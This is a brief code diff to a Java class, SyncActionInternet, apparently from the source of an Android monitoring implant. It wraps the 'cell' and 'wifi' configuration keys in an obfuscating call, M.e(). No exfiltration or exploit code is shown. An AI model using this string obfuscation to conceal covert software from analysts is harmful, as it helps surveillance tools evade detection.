@@ -16,6 +16,7 @@ import com.android.dvci.conf.ConfAction;
 import com.android.dvci.conf.ConfigurationException;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
+import com.android.mm.M;
 
 /**
  * The Class SyncActionInternet.
@@ -68,8 +69,8 @@ public class SyncActionInternet extends SyncAction {
 		}
 
 		try {
-			gprs = params.getBoolean("cell");
-			wifi = params.getBoolean("wifi");
+			gprs = params.getBoolean(M.e("cell"));
+			wifi = params.getBoolean(M.e("wifi"));
 			wifiForced = wifi;
 			
 			
